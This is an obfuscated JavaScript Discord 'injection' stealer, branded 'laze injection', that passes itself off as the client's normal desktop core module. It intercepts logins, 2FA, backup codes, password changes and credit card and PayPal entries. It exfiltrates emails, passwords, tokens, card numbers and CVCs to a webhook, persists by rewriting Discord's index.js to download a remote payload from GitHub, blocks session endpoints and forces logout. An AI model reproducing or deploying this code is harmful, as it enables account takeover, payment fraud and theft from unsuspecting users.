const _0x2a3568 = (function () {
    let _0x2c10dc = true
    return function (_0x53240a, _0x2ae57b) {
      const _0x40f5f7 = _0x2c10dc
        ? function () {
            if (_0x2ae57b) {
              const _0x51032d = _0x2ae57b.apply(_0x53240a, arguments)
              return (_0x2ae57b = null), _0x51032d
            }
          }
        : function () {}
      return (_0x2c10dc = false), _0x40f5f7
    }
  })(),
  _0x18deee = _0x2a3568(this, function () {
    return _0x18deee
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x18deee)
      .search('(((.+)+)+)+$')
  })
_0x18deee()
const _0x2e945f = (function () {
    let _0x4e4b91 = true
    return function (_0x4ff37b, _0x5b03f8) {
      const _0x21c417 = _0x4e4b91
        ? function () {
            const _0x586fdb = { Ecucx: '<:admin:967851956930482206> Admin' }
            const _0x2b846f = _0x586fdb
            if (_0x5b03f8) {
              const _0x186be5 = _0x5b03f8.apply(_0x4ff37b, arguments)
              return (_0x5b03f8 = null), _0x186be5
            }
          }
        : function () {}
      return (_0x4e4b91 = false), _0x21c417
    }
  })(),
  _0x3af17b = _0x2e945f(this, function () {
    let _0x314485
    try {
      const _0xfba425 = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x314485 = _0xfba425()
    } catch (_0x38f135) {
      _0x314485 = window
    }
    const _0x212bc7 = (_0x314485.console = _0x314485.console || {}),
      _0x626a7d = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x32657c = 0; _0x32657c < _0x626a7d.length; _0x32657c++) {
      const _0x25a0f6 = _0x2e945f.constructor.prototype.bind(_0x2e945f),
        _0x1eae90 = _0x626a7d[_0x32657c],
        _0x3cb6cd = _0x212bc7[_0x1eae90] || _0x25a0f6
      _0x25a0f6['__proto__'] = _0x2e945f.bind(_0x2e945f)
      _0x25a0f6.toString = _0x3cb6cd.toString.bind(_0x3cb6cd)
      _0x212bc7[_0x1eae90] = _0x25a0f6
    }
  })
_0x3af17b()
const fs = require('fs'),
  os = require('os'),
  https = require('https'),
  args = process.argv,
  path = require('path'),
  querystring = require('querystring'),
  { BrowserWindow, session } = require('electron'),
  _0x46ad07 = {}
_0x46ad07.urls = [
  '/auth/login',
  '/auth/register',
  '/mfa/totp',
  '/mfa/codes-verification',
  '/users/@me',
]
const _0x4dd07a = {}
_0x4dd07a.urls = [
  'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
  'https://*.discord.com/api/v*/applications/detectable',
  'https://discord.com/api/v*/applications/detectable',
  'https://*.discord.com/api/v*/users/@me/library',
  'https://discord.com/api/v*/users/@me/library',
  'wss://remote-auth-gateway.discord.gg/*',
  'https://discord.com/api/v*/auth/sessions',
  'https://*.discord.com/api/v*/auth/sessions',
  'https://discordapp.com/api/v*/auth/sessions',
]
const _0x5b67a2 = {}
_0x5b67a2.urls = [
  'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
  'https://api.stripe.com/v*/tokens',
]
const _0x430826 = {}
_0x430826.Value = 1
_0x430826.Emoji = '<:8485discordemployee:1163172252989259898>'
_0x430826.Rare = true
const _0x592c82 = {}
_0x592c82.Value = 2
_0x592c82.Emoji = '<:9928discordpartnerbadge:1163172304155586570>'
_0x592c82.Rare = true
const _0x188d58 = {}
_0x188d58.Value = 4
_0x188d58.Emoji = '<:9171hypesquadevents:1163172248140660839>'
_0x188d58.Rare = true
const _0x20bf5f = {}
_0x20bf5f.Value = 8
_0x20bf5f.Emoji = '<:4744bughunterbadgediscord:1163172239970140383>'
_0x20bf5f.Rare = true
const _0x3e85b7 = {}
_0x3e85b7.Value = 512
_0x3e85b7.Emoji = '<:5053earlysupporter:1163172241996005416>'
_0x3e85b7.Rare = true
const _0x1377e3 = {}
_0x1377e3.Value = 16384
_0x1377e3.Emoji = '<:1757bugbusterbadgediscord:1163172238942543892>'
_0x1377e3.Rare = true
const _0x5035dd = {}
_0x5035dd.Value = 131072
_0x5035dd.Emoji = '<:1207iconearlybotdeveloper:1163172236807639143>'
_0x5035dd.Rare = true
const _0x5bb705 = {}
_0x5bb705.Value = 64
_0x5bb705.Emoji = '<:6601hypesquadbravery:1163172246492287017>'
_0x5bb705.Rare = false
const _0x56ecaf = {}
_0x56ecaf.Value = 128
_0x56ecaf.Emoji = '<:6936hypesquadbrilliance:1163172244474822746>'
_0x56ecaf.Rare = false
const _0x4b8617 = {}
_0x4b8617.Value = 256
_0x4b8617.Emoji = '<:5242hypesquadbalance:1163172243417858128>'
_0x4b8617.Rare = false
const _0x4f1b15 = {}
_0x4f1b15.Value = 4194304
_0x4f1b15.Emoji = '<:1207iconactivedeveloper:1163172534443851868>'
_0x4f1b15.Rare = false
const _0x288ed7 = {}
_0x288ed7.Value = 262144
_0x288ed7.Emoji = '<:4149blurplecertifiedmoderator:1163172255489085481>'
_0x288ed7.Rare = true
const _0xce0f61 = {}
_0xce0f61.Value = 1048704
_0xce0f61.Emoji = '\u2328️'
_0xce0f61.Rare = false
const _0x1a7ff1 = {}
_0x1a7ff1.Discord_Emloyee = _0x430826
_0x1a7ff1.Partnered_Server_Owner = _0x592c82
_0x1a7ff1.HypeSquad_Events = _0x188d58
_0x1a7ff1.Bug_Hunter_Level_1 = _0x20bf5f
_0x1a7ff1.Early_Supporter = _0x3e85b7
_0x1a7ff1.Bug_Hunter_Level_2 = _0x1377e3
_0x1a7ff1.Early_Verified_Bot_Developer = _0x5035dd
_0x1a7ff1.House_Bravery = _0x5bb705
_0x1a7ff1.House_Brilliance = _0x56ecaf
_0x1a7ff1.House_Balance = _0x4b8617
_0x1a7ff1.Active_Developer = _0x4f1b15
_0x1a7ff1.Certified_Moderator = _0x288ed7
_0x1a7ff1.Spammer = _0xce0f61
const _0x164838 = {}
_0x164838.webhook = '%hooko%'
_0x164838.injection_url =
  'https://raw.githubusercontent.com/mertcuan/c-say-ya-muru/main/for/injection.js'
_0x164838.filters = _0x46ad07
_0x164838.filters2 = _0x4dd07a
_0x164838.payment_filters = _0x5b67a2
_0x164838.API = 'https://discord.com/api/v9/users/@me'
_0x164838.badges = _0x1a7ff1
const CONFIG = _0x164838,
  executeJS = (_0x56b3ce) => {
    const _0x523575 = BrowserWindow.getAllWindows()[0]
    return _0x523575.webContents.executeJavaScript(_0x56b3ce, true)
  },
  getToken = async () =>
    await executeJS(
      "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
    ),
  request = async (_0x189015, _0x120a4d, _0x46b33d, _0x5a4b23) => {
    _0x120a4d = new URL(_0x120a4d)
    const _0x4e6a54 = {}
    _0x4e6a54['Access-Control-Allow-Origin'] = '*'
    const _0x2ee1f0 = {
      protocol: _0x120a4d.protocol,
      hostname: _0x120a4d.host,
      path: _0x120a4d.pathname,
      method: _0x189015,
      headers: _0x4e6a54,
    }
    const _0x42181e = _0x2ee1f0
    if (_0x120a4d.search) {
      _0x42181e.path += _0x120a4d.search
    }
    for (const _0x2019b6 in _0x46b33d)
      _0x42181e.headers[_0x2019b6] = _0x46b33d[_0x2019b6]
    const _0x5e48c6 = https.request(_0x42181e)
    if (_0x5a4b23) {
      _0x5e48c6.write(_0x5a4b23)
    }
    return (
      _0x5e48c6.end(),
      new Promise((_0x532305, _0x2dea71) => {
        _0x5e48c6.on('response', (_0x236a17) => {
          let _0x15d211 = ''
          _0x236a17.on('data', (_0x4fc78f) => (_0x15d211 += _0x4fc78f))
          _0x236a17.on('end', () => _0x532305(_0x15d211))
        })
      })
    )
  },
  hooker = async (_0x3e791d, _0x27bfb2, _0xef8dbe) => {
    _0x3e791d.content =
      '`' +
      os.hostname() +
      '` - `' +
      os.userInfo().username +
      '`\n\n' +
      _0x3e791d.content
    _0x3e791d.username = 'laze injection'
    _0x3e791d.avatar_url = 'https://i.ibb.co/hVY5sGg/logo.png'
    const _0x7302aa = { name: _0xef8dbe.username }
    _0x3e791d.embeds[0].author = _0x7302aa
    const _0x3ade91 = {
      url:
        'https://cdn.discordapp.com/avatars/' +
        _0xef8dbe.id +
        '/' +
        _0xef8dbe.avatar +
        '.webp',
    }
    _0x3e791d.embeds[0].thumbnail = _0x3ade91
    const _0x4a9027 = {
      text: 'laze discord injection',
      icon_url: 'https://i.ibb.co/hVY5sGg/logo.png',
    }
    _0x3e791d.embeds[0].footer = _0x4a9027
    _0x3e791d.embeds[0].title = 'Account Information'
    const _0x4dc3c3 = getNitro(_0xef8dbe.premium_type),
      _0x3fc255 = getBadges(_0xef8dbe.flags),
      _0x56292b = await getBilling(_0x27bfb2),
      _0x31b29c = await getFriends(_0x27bfb2),
      _0xfcad02 = await getServers(_0x27bfb2),
      _0x478578 = {
        name: 'Billing',
        value: _0x56292b,
        inline: true,
      }
    _0x3e791d.embeds[0].fields.push(
      {
        name: 'Token',
        value: '```' + _0x27bfb2 + '```',
        inline: false,
      },
      {
        name: 'Nitro',
        value: _0x4dc3c3,
        inline: true,
      },
      {
        name: 'Badges',
        value: _0x3fc255,
        inline: true,
      },
      _0x478578
    )
    const _0x426686 = {
      title: 'Total Friends: ' + _0x31b29c.totalFriends,
      description: _0x31b29c.message,
    }
    const _0x1b4574 = {
      title: 'Total Servers: ' + _0xfcad02.totalGuilds,
      description: _0xfcad02.message,
    }
    _0x3e791d.embeds.push(_0x426686, _0x1b4574)
    for (const _0x48bc87 in _0x3e791d.embeds) {
      _0x3e791d.embeds[_0x48bc87].color = 735161
    }
    await request(
      'POST',
      CONFIG.webhook,
      { 'Content-Type': 'application/json' },
      JSON.stringify(_0x3e791d)
    )
  },
  fetch = async (_0x3efcf5, _0x4e0f7b) => {
    return JSON.parse(await request('GET', CONFIG.API + _0x3efcf5, _0x4e0f7b))
  },
  fetchAccount = async (_0x5ac8f4) =>
    await fetch('', { Authorization: _0x5ac8f4 }),
  fetchBilling = async (_0x567194) =>
    await fetch('/billing/payment-sources', { Authorization: _0x567194 }),
  fetchServers = async (_0x2016fb) =>
    await fetch('/guilds?with_counts=true', { Authorization: _0x2016fb }),
  fetchFriends = async (_0x15bee8) =>
    await fetch('/relationships', { Authorization: _0x15bee8 }),
  getNitro = (_0x556978) => {
    switch (_0x556978) {
      case 1:
        return '`Nitro Classic`'
      case 2:
        return '`Nitro Boost`'
      case 3:
        return '`Nitro Basic`'
      default:
        return '`\u274C`'
    }
  },
  getBadges = (_0x4d5664) => {
    let _0x5c57bb = ''
    for (const _0x22cf1f in CONFIG.badges) {
      let _0x584a9f = CONFIG.badges[_0x22cf1f]
      if ((_0x4d5664 & _0x584a9f.Value) == _0x584a9f.Value) {
        _0x5c57bb += _0x584a9f.Emoji + ' '
      }
    }
    return _0x5c57bb || '`\u274C`'
  },
  getRareBadges = (_0x58b5da) => {
    let _0x1d255b = ''
    for (const _0x4d5961 in CONFIG.badges) {
      let _0x3e8626 = CONFIG.badges[_0x4d5961]
      if ((_0x58b5da & _0x3e8626.Value) == _0x3e8626.Value && _0x3e8626.Rare) {
        _0x1d255b += _0x3e8626.Emoji + ' '
      }
    }
    return _0x1d255b
  },
  getBilling = async (_0x3a18b4) => {
    const _0x39e3fc = await fetchBilling(_0x3a18b4)
    let _0x45c14c = ''
    return (
      _0x39e3fc.forEach((_0x2cf5cc) => {
        if (!_0x2cf5cc.invalid) {
          switch (_0x2cf5cc.type) {
            case 1:
              _0x45c14c += '\uD83D\uDCB3 '
              break
            case 2:
              _0x45c14c += '<:paypal:1148653305376034967> '
              break
          }
        }
      }),
      _0x45c14c || '`\u274C`'
    )
  },
  getFriends = async (_0xe7aa8) => {
    const _0x367bfb = await fetchFriends(_0xe7aa8),
      _0x15332f = _0x367bfb.filter((_0xf609b1) => {
        return _0xf609b1.type == 1
      })
    let _0x4784ed = ''
    for (const _0x57307f of _0x15332f) {
      var _0x32825f = getRareBadges(_0x57307f.user.public_flags)
      if (_0x32825f != '') {
        if (!_0x4784ed) {
          _0x4784ed = '**Rare Friends:**\n'
        }
        _0x4784ed +=
          _0x32825f +
          ' ' +
          _0x57307f.user.username +
          '#' +
          _0x57307f.user.discriminator +
          '\n'
      }
    }
    _0x4784ed = _0x4784ed || '**No Rare Friends**'
    const _0x321835 = {}
    return (
      (_0x321835.message = _0x4784ed),
      (_0x321835.totalFriends = _0x367bfb.length),
      _0x321835
    )
  },
  getServers = async (_0x16c299) => {
    const _0x403d0e = await fetchServers(_0x16c299),
      _0x40ea79 = _0x403d0e.filter(
        (_0x5a3e19) => _0x5a3e19.permissions == '562949953421311'
      )
    let _0x2ffd88 = ''
    for (const _0x2fdee8 of _0x40ea79) {
      _0x2ffd88 === '' && (_0x2ffd88 += '**Rare Servers:**\n'),
        (_0x2ffd88 +=
          (_0x2fdee8.owner
            ? '<:SA_Owner:991312415352430673> Owner'
            : '<:admin:967851956930482206> Admin') +
          ' | Server Name: `' +
          _0x2fdee8.name +
          '` - Members: `' +
          _0x2fdee8.approximate_member_count +
          '`\n')
    }
    _0x2ffd88 = _0x2ffd88 || '**No Rare Servers**'
    const _0x1b95ca = {}
    return (
      (_0x1b95ca.message = _0x2ffd88),
      (_0x1b95ca.totalGuilds = _0x403d0e.length),
      _0x1b95ca
    )
  },
  EmailPassToken = async (_0x400ed5, _0x538a4f, _0x32f6ce, _0xb24007) => {
    const _0x5ca77b = await fetchAccount(_0x32f6ce),
      _0x5a8260 = {
        content: '**' + _0x5ca77b.username + '** just ' + _0xb24007 + '!',
        embeds: [
          {
            fields: [
              {
                name: 'Email',
                value: '`' + _0x400ed5 + '`',
                inline: true,
              },
              {
                name: 'Password',
                value: '`' + _0x538a4f + '`',
                inline: true,
              },
            ],
          },
        ],
      }
    hooker(_0x5a8260, _0x32f6ce, _0x5ca77b)
  },
  BackupCodesViewed = async (_0x38bb7, _0x31504d) => {
    const _0x28fdf6 = await fetchAccount(_0x31504d),
      _0x5edc58 = _0x38bb7.filter((_0x384420) => {
        return _0x384420.consumed === false
      })
    let _0x1928de = ''
    for (let _0x4581bc of _0x5edc58) {
      _0x1928de +=
        _0x4581bc.code.substr(0, 4) + '-' + _0x4581bc.code.substr(4) + '\n'
    }
    const _0x59cf52 = {
      content:
        '**' + _0x28fdf6.username + '** just viewed his 2FA backup codes!',
      embeds: [
        {
          fields: [
            {
              name: 'Backup Codes',
              value: '```' + _0x1928de + '```',
              inline: false,
            },
            {
              name: 'Email',
              value: '`' + _0x28fdf6.email + '`',
              inline: true,
            },
            {
              name: 'Phone',
              value: '`' + (_0x28fdf6.phone || 'None') + '`',
              inline: true,
            },
          ],
        },
      ],
    }
    hooker(_0x59cf52, _0x31504d, _0x28fdf6)
  },
  PasswordChanged = async (_0x3630b8, _0xa32b5f, _0x124d7e) => {
    const _0x3124cf = await fetchAccount(_0x124d7e),
      _0xdb63a8 = {
        name: 'Old Password',
        value: '`' + _0xa32b5f + '`',
        inline: true,
      }
    const _0xd244d1 = {
      content: '**' + _0x3124cf.username + '** just changed his password!',
      embeds: [
        {
          fields: [
            {
              name: 'New Password',
              value: '`' + _0x3630b8 + '`',
              inline: true,
            },
            _0xdb63a8,
          ],
        },
      ],
    }
    hooker(_0xd244d1, _0x124d7e, _0x3124cf)
  },
  CreditCardAdded = async (
    _0x57a5bf,
    _0x33e253,
    _0x412095,
    _0x11b095,
    _0x55004b
  ) => {
    const _0x3b7169 = await fetchAccount(_0x55004b),
      _0xf7166d = {
        content: '**' + _0x3b7169.username + '** just added a credit card!',
        embeds: [
          {
            fields: [
              {
                name: 'Number',
                value: '`' + _0x57a5bf + '`',
                inline: true,
              },
              {
                name: 'CVC',
                value: '`' + _0x33e253 + '`',
                inline: true,
              },
              {
                name: 'Expiration',
                value: '`' + _0x412095 + '/' + _0x11b095 + '`',
                inline: true,
              },
            ],
          },
        ],
      }
    hooker(_0xf7166d, _0x55004b, _0x3b7169)
  },
  PaypalAdded = async (_0x565bd7) => {
    const _0x16a9bf = await fetchAccount(_0x565bd7)
    const _0xeec60f = {
      content:
        '**' +
        _0x16a9bf.username +
        '** just added a <:paypal:1148653305376034967> account!',
      embeds: [
        {
          fields: [
            {
              name: 'Email',
              value: '`' + _0x16a9bf.email + '`',
              inline: true,
            },
            {
              name: 'Phone',
              value: '`' + (_0x16a9bf.phone || 'None') + '`',
              inline: true,
            },
          ],
        },
      ],
    }
    hooker(_0xeec60f, _0x565bd7, _0x16a9bf)
  },
  discordPath = (function () {
    const _0x4d47b0 = args[0].split(path.sep).slice(0, -1).join(path.sep)
    let _0xac60a4
    if (process.platform === 'win32') {
      _0xac60a4 = path.join(_0x4d47b0, 'resources')
    } else {
      if (process.platform === 'darwin') {
        _0xac60a4 = path.join(_0x4d47b0, 'Contents', 'Resources')
      }
    }
    if (fs.existsSync(_0xac60a4)) {
      return {
        resourcePath: _0xac60a4,
        app: _0x4d47b0,
      }
    }
    const _0x2f2fe3 = {}
    return (
      (_0x2f2fe3.undefined = undefined),
      (_0x2f2fe3.undefined = undefined),
      _0x2f2fe3
    )
  })()
async function updateCheck() {
  const { resourcePath: _0x5cf907, app: _0x31d04c } = discordPath
  if (_0x5cf907 === undefined || _0x31d04c === undefined) {
    return
  }
  const _0x3d6994 = path.join(_0x5cf907, 'app'),
    _0x446964 = path.join(_0x3d6994, 'package.json'),
    _0x1f2226 = path.join(_0x3d6994, 'index.js'),
    _0x1f36f6 = fs
      .readdirSync(_0x31d04c + '\\modules\\')
      .filter((_0x43037a) => /discord_desktop_core-+?/.test(_0x43037a))[0]
  const _0x22b8f7 =
      _0x31d04c +
      '\\modules\\' +
      _0x1f36f6 +
      '\\discord_desktop_core\\index.js',
    _0xdcfb51 = path.join(
      process.env.APPDATA,
      '\\betterdiscord\\data\\betterdiscord.asar'
    )
  if (!fs.existsSync(_0x3d6994)) {
    fs.mkdirSync(_0x3d6994)
  }
  if (fs.existsSync(_0x446964)) {
    fs.unlinkSync(_0x446964)
  }
  if (fs.existsSync(_0x1f2226)) {
    fs.unlinkSync(_0x1f2226)
  }
  if (process.platform === 'win32' || process.platform === 'darwin') {
    const _0x30b4cf = {
      name: 'discord',
      main: 'index.js',
    }
    fs.writeFileSync(_0x446964, JSON.stringify(_0x30b4cf, null, 4))
    const _0x481a23 =
      "const fs = require('fs'), https = require('https');\n  const indexJs = '" +
      _0x22b8f7 +
      "';\n  const bdPath = '" +
      _0xdcfb51 +
      "';\n  const fileSize = fs.statSync(indexJs).size\n  fs.readFileSync(indexJs, 'utf8', (err, data) => {\n      if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n          init();\n  })\n  async function init() {\n      https.get('" +
      CONFIG.injection_url +
      "', (res) => {\n          const file = fs.createWriteStream(indexJs);\n          res.replace('%hooko%', '" +
      CONFIG.webhook +
      "')\n          res.pipe(file);\n          file.on('finish', () => {\n              file.close();\n          });\n      \n      }).on(\"error\", (err) => {\n          setTimeout(init(), 10000);\n      });\n  }\n  require('" +
      path.join(_0x5cf907, 'app.asar') +
      "')\n  if (fs.existsSync(bdPath)) require(bdPath);"
    fs.writeFileSync(_0x1f2226, _0x481a23.replace(/\\/g, '\\\\'))
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) {
    return
  }
  fs.rmdirSync(path.join(__dirname, 'initiation'))
  const _0x3a3139 = await getToken()
  if (!_0x3a3139) {
    return
  }
  const _0xaf6e76 = await fetchAccount(_0x3a3139),
    _0x3b4dca = {
      content: '**' + _0xaf6e76.username + '** just got injected!',
      embeds: [
        {
          fields: [
            {
              name: 'Email',
              value: '`' + _0xaf6e76.email + '`',
              inline: true,
            },
            {
              name: 'Phone',
              value: '`' + (_0xaf6e76.phone || 'None') + '`',
              inline: true,
            },
          ],
        },
      ],
    }
  await hooker(_0x3b4dca, _0x3a3139, _0xaf6e76)
  executeJS(
    'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();'
  )
}
let email = '',
  password = ''
const createWindow = () => {
  mainWindow = BrowserWindow.getAllWindows()[0]
  if (!mainWindow) {
    return
  }
  mainWindow.webContents.debugger.attach('1.3')
  mainWindow.webContents.debugger.on(
    'message',
    async (_0x150df3, _0x1f6b3e, _0x4bfeef) => {
      if (_0x1f6b3e !== 'Network.responseReceived') {
        return
      }
      if (
        !CONFIG.filters.urls.some((_0x45675b) =>
          _0x4bfeef.response.url.endsWith(_0x45675b)
        )
      ) {
        return
      }
      if (![200, 202].includes(_0x4bfeef.response.status)) {
        return
      }
      const _0x48ab41 = { requestId: _0x4bfeef.requestId }
      const _0x16e741 = await mainWindow.webContents.debugger.sendCommand(
          'Network.getResponseBody',
          _0x48ab41
        ),
        _0x44c39b = JSON.parse(_0x16e741.body),
        _0x214713 = { requestId: _0x4bfeef.requestId }
      const _0x66d094 = await mainWindow.webContents.debugger.sendCommand(
          'Network.getRequestPostData',
          _0x214713
        ),
        _0x17ab2b = JSON.parse(_0x66d094.postData)
      switch (true) {
        case _0x4bfeef.response.url.endsWith('/login'):
          if (!_0x44c39b.token) {
            email = _0x17ab2b.login
            password = _0x17ab2b.password
            return
          }
          EmailPassToken(
            _0x17ab2b.login,
            _0x17ab2b.password,
            _0x44c39b.token,
            'logged in'
          )
          break
        case _0x4bfeef.response.url.endsWith('/register'):
          EmailPassToken(
            _0x17ab2b.email,
            _0x17ab2b.password,
            _0x44c39b.token,
            'signed up'
          )
          break
        case _0x4bfeef.response.url.endsWith('/totp'):
          EmailPassToken(email, password, _0x44c39b.token, 'logged in with 2FA')
          break
        case _0x4bfeef.response.url.endsWith('/codes-verification'):
          BackupCodesViewed(_0x44c39b.backup_codes, await getToken())
          break
        case _0x4bfeef.response.url.endsWith('/@me'):
          if (!_0x17ab2b.password) {
            return
          }
          _0x17ab2b.email &&
            EmailPassToken(
              _0x17ab2b.email,
              _0x17ab2b.password,
              _0x44c39b.token,
              'changed his email to **' + _0x17ab2b.email + '**'
            )
          if (_0x17ab2b.new_password) {
            PasswordChanged(
              _0x17ab2b.new_password,
              _0x17ab2b.password,
              _0x44c39b.token
            )
          }
          break
      }
    }
  )
  mainWindow.webContents.debugger.sendCommand('Network.enable')
  mainWindow.on('closed', () => {
    createWindow()
  })
}
createWindow()
session.defaultSession.webRequest.onCompleted(
  CONFIG.payment_filters,
  async (_0x54f19b, _0x4093aa) => {
    if (![200, 202].includes(_0x54f19b.statusCode)) {
      return
    }
    if (_0x54f19b.method != 'POST') {
      return
    }
    switch (true) {
      case _0x54f19b.url.endsWith('tokens'):
        const _0x530418 = querystring.parse(
          Buffer.from(_0x54f19b.uploadData[0].bytes).toString()
        )
        CreditCardAdded(
          _0x530418['card[number]'],
          _0x530418['card[cvc]'],
          _0x530418['card[exp_month]'],
          _0x530418['card[exp_year]'],
          await getToken()
        )
        break
      case _0x54f19b.url.endsWith('paypal_accounts'):
        PaypalAdded(await getToken())
        break
    }
  }
)
session.defaultSession.webRequest.onBeforeRequest(
  CONFIG.filters2,
  (_0x1241ee, _0x23b027) => {
    const _0x337c50 = { cancel: true }
    if (
      _0x1241ee.url.startsWith('wss://remote-auth-gateway') ||
      _0x1241ee.url.endsWith('auth/sessions')
    ) {
      return _0x23b027(_0x337c50)
    }
    updateCheck()
  }
)
module.exports = require('./core.asar')
